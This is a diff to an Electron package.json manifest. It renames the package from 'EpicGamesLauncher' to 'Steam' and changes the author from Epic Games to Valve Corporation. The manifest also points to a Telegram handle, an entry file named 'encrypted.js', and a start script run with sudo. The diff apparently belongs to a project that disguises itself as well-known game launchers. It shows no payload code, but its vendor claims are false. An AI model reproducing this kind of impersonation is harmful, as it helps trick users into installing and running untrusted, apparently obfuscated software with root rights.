@@ -1,9 +1,9 @@
 {
-  "name": "EpicGamesLauncher",
+  "name": "Steam",
   "version": "1.0.0",
   "description": "t.me/doenerium69",
   "main": "encrypted.js",
-  "author": "Epic Games, Inc.",
+  "author": "Valve Corporation",
   "license": "MIT",
   "scripts": {
     "start": "sudo electron .",
